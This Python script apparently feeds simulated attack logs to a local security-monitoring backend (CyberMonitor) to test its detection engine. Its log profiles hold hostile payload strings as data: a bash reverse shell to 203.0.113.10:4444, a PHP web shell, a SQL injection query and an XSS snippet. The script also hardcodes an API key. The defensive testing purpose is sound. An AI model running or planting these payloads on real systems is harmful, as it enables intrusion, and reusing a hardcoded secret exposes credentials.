import argparse
import random
import time
from datetime import datetime, timezone

import requests

# cd "E:\Dự Án\CyberMonitor\Tools"
# python .\simulate_attacks.py --list
# python .\simulate_attacks.py --mode ddos
# python .\simulate_attacks.py --mode bruteforce-ssh
# python .\simulate_attacks.py --mode combo
# python .\simulate_attacks.py --mode all


BACKEND_URL = "http://192.168.1.6:5000"
API_KEY = "sk_live_nR8C8RDRMzgMzo5wKfhpbNGgUxVC2n6C"
HOSTNAME = "Machine-B"
OS_NAME = "Windows"
TARGET_IP = "192.168.1.6"


def build_headers():
    return {
        "X-API-Key": API_KEY,
        "Content-Type": "application/json",
    }


def random_attack_ip():
    # Sinh IP public-looking, tránh private/local ranges để detector không bỏ qua.
    while True:
        octet_1 = random.randint(11, 223)
        octet_2 = random.randint(1, 254)
        octet_3 = random.randint(1, 254)
        octet_4 = random.randint(1, 254)

        if octet_1 in (10, 127, 172, 192):
            continue

        ip = f"{octet_1}.{octet_2}.{octet_3}.{octet_4}"
        if ip != TARGET_IP:
            return ip


def ingest_logs(logs):
    payload = {
        "hostname": HOSTNAME,
        "os": OS_NAME,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "logs": logs,
    }
    return requests.post(
        f"{BACKEND_URL}/api/logs/ingest",
        json=payload,
        headers=build_headers(),
        timeout=15,
    )


def make_log(
    source_ip,
    destination_port,
    raw_payload,
    *,
    bytes_in=1200,
    bytes_out=120,
    packets_in=12,
    packets_out=3,
    request_count=60,
    protocol="TCP",
    source_port=None,
):
    return {
        "sourceIp": source_ip,
        "destinationIp": TARGET_IP,
        "sourcePort": source_port if source_port is not None else random.randint(40000, 65000),
        "destinationPort": destination_port,
        "protocol": protocol,
        "bytesIn": bytes_in,
        "bytesOut": bytes_out,
        "packetsIn": packets_in,
        "packetsOut": packets_out,
        "requestCount": request_count,
        "rawPayload": raw_payload,
    }


ATTACK_PROFILES = {
    "ddos": {
        "label": "DDoS",
        "rounds": 20,
        "logs_per_round": 30,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            "GET / HTTP/1.1",
            bytes_in=2000,
            bytes_out=120,
            packets_in=35,
            packets_out=3,
            request_count=900,
        ),
    },
    "bruteforce-ssh": {
        "label": "Brute Force SSH",
        "rounds": 12,
        "logs_per_round": 25,
        "delay": 0.15,
        "builder": lambda ip, i: make_log(
            ip,
            22,
            "ssh login root password=admin123",
            bytes_in=80,
            bytes_out=24,
            packets_in=4,
            packets_out=2,
            request_count=45,
        ),
    },
    "bruteforce-http": {
        "label": "Brute Force HTTP",
        "rounds": 12,
        "logs_per_round": 20,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            443,
            "POST /login username=admin&password=123456",
            bytes_in=1500,
            bytes_out=140,
            packets_in=14,
            packets_out=3,
            request_count=110,
        ),
    },
    "portscan": {
        "label": "Port Scan",
        "rounds": 10,
        "logs_per_round": 20,
        "delay": 0.12,
        "builder": lambda ip, i: make_log(
            ip,
            [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379][i % 14],
            "SYN",
            bytes_in=70,
            bytes_out=10,
            packets_in=2,
            packets_out=1,
            request_count=1,
        ),
    },
    "sqli": {
        "label": "SQL Injection",
        "rounds": 10,
        "logs_per_round": 15,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            "GET /login?id=1 UNION SELECT username,password FROM users --",
            bytes_in=2200,
            bytes_out=180,
            packets_in=18,
            packets_out=4,
            request_count=120,
        ),
    },
    "malware": {
        "label": "Malware / Reverse Shell",
        "rounds": 8,
        "logs_per_round": 12,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            4444,
            "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
            bytes_in=3000,
            bytes_out=900000,
            packets_in=40,
            packets_out=90,
            request_count=160,
        ),
    },
    "xss": {
        "label": "XSS",
        "rounds": 8,
        "logs_per_round": 10,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            '<script>document.cookie="steal"</script>',
            bytes_in=1800,
            bytes_out=160,
            packets_in=12,
            packets_out=3,
            request_count=80,
        ),
    },
    "dns-amplification": {
        "label": "DNS Amplification",
        "rounds": 10,
        "logs_per_round": 20,
        "delay": 0.16,
        "builder": lambda ip, i: make_log(
            ip,
            53,
            "ANY example.com",
            bytes_in=300,
            bytes_out=7000,
            packets_in=5,
            packets_out=18,
            request_count=220,
            protocol="UDP",
        ),
    },
    "mitm": {
        "label": "MITM",
        "rounds": 7,
        "logs_per_round": 10,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            443,
            "certificate anomaly arp spoof sslstrip session hijack",
            bytes_in=2600,
            bytes_out=400,
            packets_in=16,
            packets_out=5,
            request_count=75,
        ),
    },
    "lateral-movement": {
        "label": "Lateral Movement",
        "rounds": 8,
        "logs_per_round": 14,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            [445, 3389, 5985, 135][i % 4],
            "wmic psexec smb lateral movement",
            bytes_in=2400,
            bytes_out=500,
            packets_in=14,
            packets_out=5,
            request_count=90,
        ),
    },
    "data-exfiltration": {
        "label": "Data Exfiltration",
        "rounds": 6,
        "logs_per_round": 10,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            443,
            "upload confidential archive to remote storage",
            bytes_in=1500,
            bytes_out=12000000,
            packets_in=10,
            packets_out=160,
            request_count=140,
        ),
    },
    "dns-tunneling": {
        "label": "DNS Tunneling",
        "rounds": 8,
        "logs_per_round": 18,
        "delay": 0.17,
        "builder": lambda ip, i: make_log(
            ip,
            53,
            "dGhpcy1pcy1sb25nLWJhc2U2NC1kbnMtdHVubmVsaW5nLWRhdGE=",
            bytes_in=700,
            bytes_out=200,
            packets_in=9,
            packets_out=3,
            request_count=100,
            protocol="UDP",
        ),
    },
    "slowloris": {
        "label": "Slowloris",
        "rounds": 10,
        "logs_per_round": 25,
        "delay": 0.12,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            "GET / HTTP/1.1\r\nHost: target\r\nX-a: keep-open",
            bytes_in=40,
            bytes_out=10,
            packets_in=1,
            packets_out=1,
            request_count=20,
        ),
    },
    "syn-flood": {
        "label": "SYN Flood",
        "rounds": 12,
        "logs_per_round": 30,
        "delay": 0.1,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            "SYN",
            bytes_in=64,
            bytes_out=0,
            packets_in=1,
            packets_out=0,
            request_count=260,
        ),
    },
    "icmp-flood": {
        "label": "ICMP Flood",
        "rounds": 8,
        "logs_per_round": 30,
        "delay": 0.12,
        "builder": lambda ip, i: make_log(
            ip,
            0,
            "ICMP echo request",
            bytes_in=512,
            bytes_out=64,
            packets_in=20,
            packets_out=2,
            request_count=180,
            protocol="ICMP",
        ),
    },
    "web-shell-upload": {
        "label": "Web Shell Upload",
        "rounds": 7,
        "logs_per_round": 10,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            80,
            'POST /upload file=shell.php content="<?php system($_GET[\'cmd\']); ?>"',
            bytes_in=5000,
            bytes_out=240,
            packets_in=22,
            packets_out=4,
            request_count=70,
        ),
    },
    "privilege-escalation": {
        "label": "Privilege Escalation",
        "rounds": 7,
        "logs_per_round": 10,
        "delay": 0.2,
        "builder": lambda ip, i: make_log(
            ip,
            22,
            "sudo su root token impersonate SeDebugPrivilege",
            bytes_in=1400,
            bytes_out=200,
            packets_in=9,
            packets_out=3,
            request_count=55,
        ),
    },
    "cryptomining": {
        "label": "Cryptomining",
        "rounds": 8,
        "logs_per_round": 16,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            3333,
            "stratum+tcp://pool.supportxmr.com wallet=miner",
            bytes_in=2400,
            bytes_out=1500,
            packets_in=18,
            packets_out=15,
            request_count=120,
        ),
    },
    "suspicious-protocol": {
        "label": "Suspicious Protocol",
        "rounds": 8,
        "logs_per_round": 15,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            [31337, 6666, 7777, 8888][i % 4],
            "weird custom protocol beacon",
            bytes_in=1200,
            bytes_out=400,
            packets_in=8,
            packets_out=5,
            request_count=65,
            protocol="UNKNOWN",
        ),
    },
    "zero-day-anomaly": {
        "label": "Zero-day Anomaly",
        "rounds": 8,
        "logs_per_round": 14,
        "delay": 0.18,
        "builder": lambda ip, i: make_log(
            ip,
            [8443, 5001, 27017, 6379][i % 4],
            "odd sequence base64 payload custom beacon exfil scan",
            bytes_in=8000,
            bytes_out=6000,
            packets_in=28,
            packets_out=20,
            request_count=190,
            protocol="TCP",
        ),
    },
}


DEFAULT_COMBO = [
    "ddos",
    "bruteforce-ssh",
    "bruteforce-http",
    "portscan",
    "sqli",
    "malware",
    "xss",
]


def run_profile(mode_name):
    profile = ATTACK_PROFILES[mode_name]
    print(f"[{profile['label']}] Bat dau mo phong...")

    for round_index in range(profile["rounds"]):
        attack_ip = random_attack_ip()
        logs = [
            profile["builder"](attack_ip, log_index)
            for log_index in range(profile["logs_per_round"])
        ]

        response = ingest_logs(logs)
        print(
            f"[{profile['label']}] Round {round_index + 1}/{profile['rounds']} "
            f"| IP {attack_ip}: {response.status_code} - {response.text}"
        )
        time.sleep(profile["delay"])


def list_modes():
    print("Danh sach mode test:")
    for mode_name, profile in ATTACK_PROFILES.items():
        print(f"- {mode_name}: {profile['label']}")
    print("- combo: chay bo hay gap")
    print("- all: chay tat ca profile")


def main():
    parser = argparse.ArgumentParser(description="CyberMonitor multi-attack simulation tool")
    parser.add_argument(
        "--mode",
        default="combo",
        help="Mode can chay: combo, all, hoac mot profile cu the",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="In danh sach mode ho tro",
    )
    args = parser.parse_args()

    if args.list:
        list_modes()
        return

    if args.mode == "combo":
        selected_modes = DEFAULT_COMBO
    elif args.mode == "all":
        selected_modes = list(ATTACK_PROFILES.keys())
    elif args.mode in ATTACK_PROFILES:
        selected_modes = [args.mode]
    else:
        raise SystemExit(f"Mode khong hop le: {args.mode}. Dung --list de xem danh sach.")

    for mode_name in selected_modes:
        run_profile(mode_name)

    print("Xong. Doi AI engine quet va kiem tra alert/block command.")


if __name__ == "__main__":
    main()
